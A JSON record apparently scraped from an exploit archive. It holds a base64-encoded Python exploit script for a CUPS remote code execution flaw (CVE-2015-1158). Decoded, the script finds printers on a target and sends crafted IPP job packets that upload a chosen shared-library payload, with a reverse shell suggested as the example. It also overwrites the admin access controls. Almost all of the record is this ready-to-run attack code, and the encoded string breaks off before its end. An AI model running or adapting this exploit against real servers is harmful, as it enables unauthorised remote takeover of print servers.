{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCiMgRXhwbG9pdCBUaXRsZTogQ1VQUyBSZWZlcmVuY2UgQ291bnQgT3ZlciBEZWNyZW1lbnQgUmVtb3RlIENvZGUgRXhlY3V0aW9uDQojIEdvb2dsZSBEb3JrOiBuL2ENCiMgRGF0ZTogMi8yLzE3DQojIEV4cGxvaXQgQXV0aG9yOiBAMHgwMHN0cmluZw0KIyBWZW5kb3IgSG9tZXBhZ2U6IGN1cHMub3JnDQojIFNvZnR3YXJlIExpbms6IGh0dHBzOi8vZ2l0aHViLmNvbS9hcHBsZS9jdXBzL3JlbGVhc2VzL3RhZy9yZWxlYXNlLTIuMC4yDQojIFZlcnNpb246IDwyLjAuMw0KIyBUZXN0ZWQgb246IFVidW50dSAxNC8xNQ0KIyBDVkUgOiBDVkUtMjAxNS0xMTU4DQppbXBvcnQgb3MsIHJlLCBzb2NrZXQsIHJhbmRvbSwgdGltZSwgZ2V0b3B0LCBzeXMNCmZyb20gc29ja2V0IGltcG9ydCAqDQpmcm9tIHN0cnVjdCBpbXBvcnQgKg0KDQpkZWYgYmFubmVyKCk6DQogICAgcHJpbnQgJycnDQogICAgICAgICAgICAgbG9sIHR5IGdvb2dsZQ0KICAgICAgICAgICAgIDAwMDAwMDAwMDAwMDANCiAgICAgICAgICAwMDAwMDAwMDAwMDAwMDAwMDAwICAgMDANCiAgICAgICAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMA0KICAgICAgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMA0KICAgIDAwMDAwMDAwMCAgICAgICAgICAgICAwMDAwMDAwMDAwDQogICAwMDAwMDAwMCAgICAgICAgICAgICAgIDAwMDAwMDAwMDANCiAgMDAwMDAwMCAgICAgICAgICAgICAgICAwMDAwMDAwMDAwMDANCiAwMDAwMDAwICAgICAgICAgICAgICAgMDAwMDAwMDAwMDAwMDAwDQogMDAwMDAwICAgICAgICAgICAgICAwMDAwMDAwMDAgIDAwMDAwMA0KMDAwMDAwMCAgICAgICAgICAgIDAwMDAwMDAwMCAgICAgMDAwMDAwDQowMDAwMDAgICAgICAgICAgICAwMDAwMDAwMDAgICAgICAwMDAwMDANCjAwMDAwMCAgICAgICAgICAwMDAwMDAwMDAgICAgICAgIDAwMDAwMA0KMDAwMDAwICAgICAgICAgMDAwMDAwMDAgICAgICAgICAgMDAwMDAwDQowMDAwMDAgICAgICAgMDAwMDAwMDAwICAgICAgICAgICAwMDAwMDANCjAwMDAwMDAgICAgMDAwMDAwMDAwICAgICAgICAgICAgMDAwMDAwMA0KIDAwMDAwMCAgIDAwMDAwMDAwMCAgICAgICAgICAgICAwMDAwMDANCiAwMDAwMDAwMDAwMDAwMDAwICAgICAgICAgICAgICAwMDAwMDAwDQogIDAwMDAwMDAwMDAwMDAgICAgICAgICAgICAgICAwMDAwMDAwDQogICAwMDAwMDAwMDAwMCAgICAgICAgICAgICAgMDAwMDAwMDANCiAgIDAwMDAwMDAwMDAwICAgICAgICAgICAgMDAwMDAwMDAwDQogIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDANCiAgIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwDQogICAgIDAwMCAgMDAwMDAwMDAwMDAwMDAwMDAwMA0KICAgICAgICAgICAgIDAwMDAwMDAwMDAwMDANCiAgICAgICAgICAgICAgQDB4MDBzdHJpbmcNCmdpdGh1Yi5jb20vMHgwMHN0cmluZy9vbGRheXMvQ1ZFLTIwMTUtMTE1OC5weQ0KJycnDQoNCmRlZiB1c2FnZSAoKToNCiAgICBwcmludCAgICgicHl0aG9uIHNjcmlwdC5weSA8YXJncz5cbiINCiAgICAgICAgICAgICIgICAtaCwgLS1oZWxwOiAgICAgICAgICAgICBTaG93IHRoaXMgbWVzc2FnZVxuIg0KICAgICAgICAgICAgIiAgIC1hLCAtLXJob3N0OiAgICAgICAgICAgIFRhcmdldCBJUCBhZGRyZXNzXG4iDQogICAgICAgICAgICAiICAgLWIsIC0tcnBvcnQ6ICAgICAgICAgICAgVGFyZ2V0IElQUCBzZXJ2aWNlIHBvcnRcbiINCiAgICAgICAgICAgICIgICAtYywgLS1saWIgICAgICAgICAgICAgICAvcGF0aC90by9wYXlsb2FkLnNvXG4iDQogICAgICAgICAgICAiICAgLWYsIC0tc3RvbXAtb25seSAgICAgICAgT25seSBzdG9tcCB0aGUgQUNMIChubyBwb3N0ZXgpXG4iDQogICAgICAgICAgICAiXG4iDQogICAgICAgICAgICAiRXhhbXBsZXM6XG4iDQogICAgICAgICAgICAicHl0aG9uIHNjcmlwdC5weSAtYSAxMC4xMC4xMC4xMCAtYiA2MzEgLWZcbiINCiAgICAgICAgICAgICJweXRob24gc2NyaXB0LnB5IC1hIDEwLjEwLjEwLjEwIC1iIDYzMSAtYyAvdG1wL3g4NnJldmVyc2VzaGVsbC5zb1xuIikNCiAgICBleGl0KCkNCg0KZGVmIHByZXR0eSAodCwgbSk6DQogICAgICAgIGlmICh0IGlzICIrIik6DQogICAgICAgICAgICAgICAgcHJpbnQgIlx4MWJbMzI7MW1bK11ceDFiWzBtXHQiICsgbSArICJcbiIsDQogICAgICAgIGVsaWYgKHQgaXMgIi0iKToNCiAgICAgICAgICAgICAgICBwcmludCAiXHgxYlszMTsxbVstXVx4MWJbMG1cdCIgKyBtICsgIlxuIiwNCiAgICAgICAgZWxpZiAodCBpcyAiKiIpOg0KICAgICAgICAgICAgICAgIHByaW50ICJceDFiWzM0OzFtWypdXHgxYlswbVx0IiArIG0gKyAiXG4iLA0KICAgICAgICBlbGlmICh0IGlzICIhIik6DQogICAgICAgICAgICAgICAgcHJpbnQgIlx4MWJbMzM7MW1bIV1ceDFiWzBtXHQiICsgbSArICJcbiIsDQoNCmRlZiBjcmVhdGVEdW1wIChpbnB1dCk6DQogICAgICAgIGQsIGIsIGggPSAnJywgW10sIFtdDQogICAgICAgIHUgPSBsaXN0KGlucHV0KQ0KICAgICAgICBmb3IgZSBpbiB1Og0KICAgICAgICAgICAgICAgIGguYXBwZW5kKGUuZW5jb2RlKCJoZXgiKSkNCiAgICAgICAgICAgICAgICBpZiBlID09ICcweDAnOg0KICAgICAgICAgICAgICAgICAgICAgICAgYi5hcHBlbmQoJzAnKQ0KICAgICAgICAgICAgICAgIGVsaWYgMzAgPiBvcmQoZSkgb3Igb3JkKGUpID4gMTI4Og0KICAgICAgICAgICAgICAgICAgICAgICAgYi5hcHBlbmQoJy4nKQ0KICAgICAgICAgICAgICAgIGVsaWYgMzAgPCBvcmQoZSkgb3Igb3JkKGUpIDwgMTI4Og0KICAgICAgICAgICAgICAgICAgICAgICAgYi5hcHBlbmQoZSkNCg0KICAgICAgICBpID0gMA0KICAgICAgICB3aGlsZSBpIDwgbGVuKGgpOg0KICAgICAgICAgICAgICAgIGlmIChsZW4oaCkgLSBpICkgPj0gMTY6DQogICAgICAgICAgICAgICAgICAgICAgICBkICs9ICcgJy5qb2luKGhbaTppKzE2XSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGQgKz0gIiAgICAgICAgICINCiAgICAgICAgICAgICAgICAgICAgICAgIGQgKz0gJyAnLmpvaW4oYltpOmkrMTZdKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZCArPSAiXG4iDQogICAgICAgICAgICAgICAgICAgICAgICBpID0gaSArIDE2DQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGQgKz0gJyAnLmpvaW4oaFtpOihsZW4oaCkgLSAwICldKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcGFkID0gbGVuKCcgJy5qb2luKGhbaToobGVuKGgpIC0gMCApXSkpDQogICAgICAgICAgICAgICAgICAgICAgICBkICs9ICcgJyAqICg1NiAtIHBhZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGQgKz0gJyAnLmpvaW4oYltpOihsZW4oaCkgLSAwICldKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZCArPSAiXG4iDQogICAgICAgICAgICAgICAgICAgICAgICBpID0gaSArIGxlbihoKQ0KDQogICAgICAgIHJldHVybiBkDQoNCmNsYXNzIHRjcHNvY2s6DQogICAgZGVmIF9faW5pdF9fKHNlbGYsIHNvY2s9Tm9uZSk6DQogICAgICAgIGlmIHNvY2sgaXMgTm9uZToNCiAgICAgICAgICAgIHNlbGYuc29jayA9IHNvY2tldCgNCiAgICAgICAgICAgIEFGX0lORVQsIFNPQ0tfU1RSRUFNKQ0KICAgICAgICAgICAgc2VsZi5zb2NrLnNldHRpbWVvdXQoMzApDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzZWxmLnNvY2sgPSBzb2NrDQogICAgZGVmIGNvbm5lY3Qoc2VsZiwgaG9zdCwgcG9ydCk6DQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChob3N0LCBpbnQocG9ydCkpKQ0KICAgIGRlZiB0eChzZWxmLCBtc2cpOg0KICAgICAgICBzZWxmLnNvY2suc2VuZChtc2cpDQogICAgZGVmIHJ4KHNlbGYpOg0KICAgICAgICB0bXAgID0gc2VsZi5zb2NrLnJlY3YoMTAyNCkNCiAgICAgICAgbXNnID0gIiINCiAgICAgICAgd2hpbGUgdG1wOg0KICAgICAgICAgICAgbXNnICs9IHRtcA0KICAgICAgICAgICAgdG1wICA9IHNlbGYuc29jay5yZWN2KDEwMjQpDQogICAgICAgIHJldHVybiBtc2cNCg0KZGVmIHR4cnggKGlwLCBwb3J0LCBwcm90bywgdHhwYWNrZXQpOg0KICAgIGlmIChwcm90byBpcyAidGNwIik6DQogICAgICAgIHNvY2sgPSB0Y3Bzb2NrKCkNCiAgICBlbGlmIChwcm90byBpcyAidWRwIik6DQogICAgICAgIHNvY2sgPSB1ZHBzb2NrKCkNCiAgICBlbHNlOg0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIHNvY2suY29ubmVjdChpcCwgcG9ydCkNCiAgICBzb2NrLnR4KHR4cGFja2V0KQ0KICAgIHJ4cGFja2V0ID0gc29jay5yeCgpDQogICAgcmV0dXJuIHJ4cGFja2V0DQoNCmRlZiBsb2NhdGVQcmludGVycyhyaG9zdCwgcnBvcnQ9IjYzMSIpOg0KICAgIHJlcXVlc3QgPSAoICJHRVQgL3ByaW50ZXJzIEhUVFAvMS4xXHgwZFx4MGEiDQogICAgICAgICJIb3N0OiAiICsgcmhvc3QgKyAiOiIgKyBycG9ydCArICJceDBkXHgwYSINCiAgICAgICAgIlVzZXItQWdlbnQ6IENVUFMvMi4wLjJceDBkXHgwYSINCiAgICAgICAgIkNvbm5lY3Rpb246IENsb3NlXHgwZFx4MGEiDQogICAgICAgICJceDBkXHgwYSIpDQogICAgcmVzcG9uc2UgPSB0eHJ4KHJob3N0LCBpbnQocnBvcnQpLCAidGNwIiwgcmVxdWVzdCkNCiAgICBpZiByZXNwb25zZSBpcyBub3QgTm9uZToNCiAgICAgICAgbSA9IHJlLnNlYXJjaCgnPFRSPjxURD48QSBIUkVGPSIoLispIj4uKzwvQT48L1REPjxURD4uKzwvVEQ+PFREPjwvVEQ+PFREPi4rPC9URD48VEQ+JywgcmVzcG9uc2UpDQogICAgICAgIGlmIG0gaXMgbm90IE5vbmU6DQogICAgICAgICAgICBwcmludGVyID0gbS5ncm91cCgxKQ0KICAgICAgICAgICAgcHJldHR5KCIrIiwicHJpbnRlciBmb3VuZDogIiArIHByaW50ZXIpDQogICAgZWxzZToNCiAgICAgICAgcHJldHR5KCItIiwibm8gcHJpbnRlcnMiKQ0KICAgICAgICBleGl0KDEpDQogICAgcmV0dXJuIHByaW50ZXINCg0KZGVmIHByZXBhcmVQYXlsb2FkKGxpYnBhdGgpOg0KICAgIHdpdGggb3BlbihsaWJwYXRoLCAncmInKSBhcyBmOg0KICAgICAgICBwYXlsb2FkID0gZi5yZWFkKCkNCiAgICBpZiBwYXlsb2FkIGlzIG5vdCBOb25lOg0KICAgICAgICBwcmV0dHkoIioiLCJQYXlsb2FkOlxuIiArIGNyZWF0ZUR1bXAocGF5bG9hZCkpDQogICAgZWxzZToNCiAgICAgICAgcHJldHR5KCItIiwic29tZXRoaW5nIHdlbnQgd3JvbmciKQ0KICAgICAgICB1c2FnZSgpDQogICAgcmV0dXJuIHBheWxvYWQNCg0KZGVmIHNlZWRUYXJnZXQocmhvc3QsIHJwb3J0LCBwcmludGVyLCBwYXlsb2FkKToNCiAgICBpID0gcmFuZG9tLnJhbmRpbnQoMSwzKQ0KICAgIHJlcWlkID0gc3RyKHBhY2soIj5pIiwoaSsyKSkpDQogICAgcmVxaWQyID0gc3RyKHBhY2soIj5pIiwoaSszKSkpDQogICAgcHJpbnRlcl91cmkgPSAiaXBwOi8vIiArIHJob3N0ICsgIjoiICsgc3RyKHJwb3J0KSArIHByaW50ZXINCg0KICAgIGNyZWF0ZV9qb2JfcGFja2V0ID0gKCJceDAyXHgwMCINCiAgICAgICAgICAgICAgICAgICAgICAgICAiXHgwMFx4MDUiKw0KICAgICAgICAgICAgICAgICAgICAgICAgIHJlcWlkKw0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDAxIg0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDQ3IisiXHgwMFx4MTIiKyJhdHRyaWJ1dGVzLWNoYXJzZXQiKyJceDAwXHgwNSIrInV0Zi04Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDQ4IisiXHgwMFx4MWIiKyJhdHRyaWJ1dGVzLW5hdHVyYWwtbGFuZ3VhZ2UiKyJceDAwXHgwNSIrImVuLXVzIg0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDQ1IisiXHgwMFx4MGIiKyJwcmludGVyLXVyaSIgKyBzdHIocGFjaygiPmgiLCBsZW4ocHJpbnRlcl91cmkpKSkgKyBwcmludGVyX3VyaSArDQogICAgICAgICAgICAgICAgICAgICAgICAgIlx4NDIiKyJceDAwXHgxNCIrInJlcXVlc3RpbmctdXNlci1uYW1lIisiXHgwMFx4MDQiKyJyb290Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDQyIisiXHgwMFx4MDgiKyJqb2ItbmFtZSIrIlx4MDBceDA2IisiYmFkbGliIg0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDAyIg0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDIxIisiXHgwMFx4MDYiKyJjb3BpZXMiKyJceDAwXHgwNCIrIlx4MDBceDAwXHgwMFx4MDEiDQogICAgICAgICAgICAgICAgICAgICAgICAgIlx4MjMiKyJceDAwXHgwYSIrImZpbmlzaGluZ3MiKyJceDAwXHgwNCIrIlx4MDBceDAwXHgwMFx4MDMiDQogICAgICAgICAgICAgICAgICAgICAgICAgIlx4NDIiKyJceDAwXHgxMCIrImpvYi1jYW5jZWwtYWZ0ZXIiKyJceDAwXHgwNSIrIlx4MzFceDMwXHgzOFx4MzBceDMwIg0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDQ0IisiXHgwMFx4MGUiKyJqb2ItaG9sZC11bnRpbCIrIlx4MDBceDBhIisiaW5kZWZpbml0ZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAiXHgyMSIrIlx4MDBceDBjIisiam9iLXByaW9yaXR5IisiXHgwMFx4MDQiKyJceDAwXHgwMFx4MDBceDMyIg0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDQyIisiXHgwMFx4MGEiKyJqb2Itc2hlZXRzIisiXHgwMFx4MDQiKyJub25lIisiXHg0MiIrIlx4MDBceDAwXHgwMFx4MDQiKyJub25lIg0KICAgICAgICAgICAgICAgICAgICAgICAgICJceDIxIisiXHgwMFx4MDkiKyJudW1iZXItdXAiKyJceDAwXHgwNCIrIlx4MDBceDAwXHgwMFx4MDEiDQogICAgICAgICAgICAgICAgICAgICAgICAgIlx4MDMiKQ0KICAgIHByZXR0eSgiKiIsIlNlbmRpbmcgY3JlYXRlSm9iIikNCg0KICAgIGh0dHBfaGVhZGVyMSA9ICggIlBPU1QgIiArIHByaW50ZXIgKyAiIEhUVFAvMS4xXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9pcHBceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgICAgICJIb3N0OiAiICsgcmhvc3QgKyAiOiIgKyBzdHIocnBvcnQpICsgIlx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQ6IENVUFMvMi4wLjJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgICAgICJDb25uZWN0aW9uOiBDbG9zZVx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtTGVuZ3RoOiAiICsgc3RyKGxlbihjcmVhdGVfam9iX3BhY2tldCkgKyAwKSArICJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgICAgICJceDBkXHgwYSIpDQoNCiAgICBjcmVhdGVKb2JSZXF1ZXN0ID0gaHR0cF9oZWFkZXIxICsgY3JlYXRlX2pvYl9wYWNrZXQNCiAgICBibGFoID0gdHhyeChyaG9zdCxpbnQocnBvcnQpLCJ0Y3AiLGNyZWF0ZUpvYlJlcXVlc3QpDQogICAgaWYgYmxhaCBpcyBub3QgTm9uZToNCiAgICAgICAgbSA9IHJlLnNlYXJjaCgiaXBwOi8vIiArIHJob3N0ICsgIjoiICsgc3RyKHJwb3J0KSArICIvam9icy8oXGQrKSIsYmxhaCkNCiAgICAgICAgaWYgbSBpcyBub3QgTm9uZToNCiAgICAgICAgICAgIGpvYmlkID0gbS5ncm91cCgxKQ0KICAgIGVsc2U6DQogICAgICAgIHByZXR0eSgiLSIsInNvbWV0aGluZyB3ZW50IHdyb25nIik7DQogICAgICAgIGV4aXQoKQ0KDQogICAgcHJldHR5KCIqIiwiXG4iICsgY3JlYXRlRHVtcChibGFoKSArICJcbiIpDQogICAgcHJldHR5KCIqIiwgIlNlbmRpbmcgc2VuZEpvYiIpDQoNCiAgICBzZW5kX2RvY3VtZW50X3BhY2tldCA9ICgiXHgwMlx4MDAiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlx4MDBceDA2IisNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXFpZDIrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlx4MDEiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlx4NDciKyJceDAwXHgxMiIrImF0dHJpYnV0ZXMtY2hhcnNldCIrIlx4MDBceDA1IisidXRmLTgiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlx4NDgiKyJceDAwXHgxYiIrImF0dHJpYnV0ZXMtbmF0dXJhbC1sYW5ndWFnZSIrIlx4MDBceDA1IisiZW4tdXMiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlx4NDUiKyJceDAwXHgwYiIrInByaW50ZXItdXJpIiArIHN0cihwYWNrKCI+aCIsIGxlbihwcmludGVyX3VyaSkpKSArIHByaW50ZXJfdXJpICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXHgyMSIrIlx4MDBceDA2Iisiam9iLWlkIisiXHgwMFx4MDQiKyBzdHIocGFjaygiPmkiLCBpbnQoam9iaWQpKSkgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJceDQyIisiXHgwMFx4MTQiKyJyZXF1ZXN0aW5nLXVzZXItbmFtZSIrIlx4MDBceDA0Iisicm9vdCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXHg0MiIrIlx4MDBceDBkIisiZG9jdW1lbnQtbmFtZSIrIlx4MDBceDA2IisiYmFkbGliIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJceDQ5IisiXHgwMFx4MGYiKyJkb2N1bWVudC1mb3JtYXQiKyJceDAwXHgxOCIrImFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXHgyMiIrIlx4MDBceDBkIisibGFzdC1kb2N1bWVudCIrIlx4MDBceDAxIisiXHgwMSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXHgwMyIrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZCkNCg0KICAgIGh0dHBfaGVhZGVyMiA9ICggIlBPU1QgIiArIHByaW50ZXIgKyAiIEhUVFAvMS4xXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9pcHBceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgICAgICJIb3N0OiAiICsgcmhvc3QgKyAiOiIgKyBzdHIocnBvcnQpICsgIlx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQ6IENVUFMvMi4wLjJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgICAgICJDb25uZWN0aW9uOiBDbG9zZVx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtTGVuZ3RoOiAiICsgc3RyKGxlbihzZW5kX2RvY3VtZW50X3BhY2tldCkgKyAwKSArICJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgICAgICJceDBkXHgwYSIpDQoNCiAgICBzZW5kSm9iUmVxdWVzdCA9IGh0dHBfaGVhZGVyMiArIHNlbmRfZG9jdW1lbnRfcGFja2V0DQogICAgYmxhaDIgPSB0eHJ4KCIxNzIuMjAuMzIuMyIsNjMxLCJ0Y3AiLHNlbmRKb2JSZXF1ZXN0KQ0KICAgIHByZXR0eSgiKiIsIlxuIiArIGNyZWF0ZUR1bXAoYmxhaCkgKyAiXG4iKQ0KICAgIHByZXR0eSgiKiIsImpvYiBpZDogIiArIGpvYmlkKQ0KICAgIHJldHVybiBqb2JpZA0KDQpkZWYgc3RvbXBBQ0wocmhvc3QsIHJwb3J0LCBwcmludGVyKToNCiAgICBpID0gcmFuZG9tLnJhbmRpbnQoMSwxMDI0KQ0KICAgIHByaW50ZXJfdXJsID0gImlwcDovLyIgKyByaG9zdCArICI6IiArIHJwb3J0ICsgcHJpbnRlcg0KDQogICAgYWRtaW5fc3RvbXAgPSAoIlx4MDJceDAwIiAgICAgICMgICB2ZXJzIDIuMA0KICAgICAgICAgICAgICAgICJceDAwXHgwNSIrICAgICAjICAgb3AgaWQ6IENyZWF0ZSBKb2IgKDB4MDAwNSkNCiAgICAgICAgICAgICAgICBzdHIocGFjaygiPmkiLChpKzEpKSkrDQogICAgICAgICAgICAgICAgIlx4MDEiICAgICAgIyAgIG9wIGF0dHJpYnV0ZXMgbWFya2VyDQogICAgICAgICAgICAgICAgIlx4NDciICAgICAgIyAgIGNoYXJzZXQNCiAgICAgICAgICAgICAgICAiXHgwMFx4MTIiICAgICAgIyAgIG5hbWUgbGVuOiAxOA0KICAgICAgICAgICAgICAgICJhdHRyaWJ1dGVzLWNoYXJzZXQiDQogICAgICAgICAgICAgICAgIlx4MDBceDA4IiAgICAgICMgICB2YWwgbGVuOiA4DQogICAgICAgICAgICAgICAgInVzLWFzY2lpIg0KICAgICAgICAgICAgICAgICJceDQ4IiAgICAgICMgICBuYXR1cmFsIGxhbmd1YWdlDQogICAgICAgICAgICAgICAgIlx4MDBceDFiIiAgICAgICMgICBuYW1lIGxlbjogMjcNCiAgICAgICAgICAgICAgICAiYXR0cmlidXRlcy1uYXR1cmFsLWxhbmd1YWdlIg0KICAgICAgICAgICAgICAgICJceDAwXHgwNiIgICAgICAjICAgdmFsIGxlbjogNg0KICAgICAgICAgICAgICAgICIvYWRtaW4iDQogICAgICAgICAgICAgICAgIlx4NDUiICAgICAgIyAgIHByaW50ZXItdXJpDQogICAgICAgICAgICAgICAgIlx4MDBceDBiIiAgICAgICMgICBuYW1lIGxlbiAxMQ0KICAgICAgICAgICAgICAgICJwcmludGVyLXVyaSIgKw0KICAgICAgICAgICAgICAgIHN0cihwYWNrKCI+aCIsIGxlbihwcmludGVyX3VybCkpKSArIHByaW50ZXJfdXJsICsNCiAgICAgICAgICAgICAgICAiXHg0MiIgICAgICAjICAgbmFtZSB3aXRob3V0IGxhbmcNCiAgICAgICAgICAgICAgICAiXHgwMFx4MTQiICAgICAgIyAgIG5hbWUgbGVuOiAyMA0KICAgICAgICAgICAgICAgICJyZXF1ZXN0aW5nLXVzZXItbmFtZSINCiAgICAgICAgICAgICAgICAiXHgwMFx4MDYiICAgICAgIyAgIHZhbCBsZW46IDYNCiAgICAgICAgICAgICAgICAiL2FkbWluIg0KICAgICAgICAgICAgICAgICJceDAyIiAgICAgICMgICBqb2IgYXR0cnMgbWFya2VyDQogICAgICAgICAgICAgICAgIlx4MjEiICAgICAgIyAgIGludGVnZXINCiAgICAgICAgICAgICAgICAiXHgwMFx4MDYiICAgICAgIyAgIG5hbWUgbGVuOiA2DQogICAgICAgICAgICAgICAgImNvcGllcyINCiAgICAgICAgICAgICAgICAiXHgwMFx4MDQiICAgICAgIyAgIHZhbCBsZW46IDQNCiAgICAgICAgICAgICAgICAiXHgwMFx4MDBceDAwXHgwMSIgICMgICAxDQogICAgICAgICAgICAgICAgIlx4NDIiICAgICAgIyAgIG5hbWUgdy9vIGxhbmcNCiAgICAgICAgICAgICAgICAiXHgwMFx4MTkiICAgICAgIyAgIG5hbWUgbGVuOiAyNQ0KICAgICAgICAgICAgICAgICJqb2Itb3JpZ2luYXRpbmctaG9zdC1uYW1lIg0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDM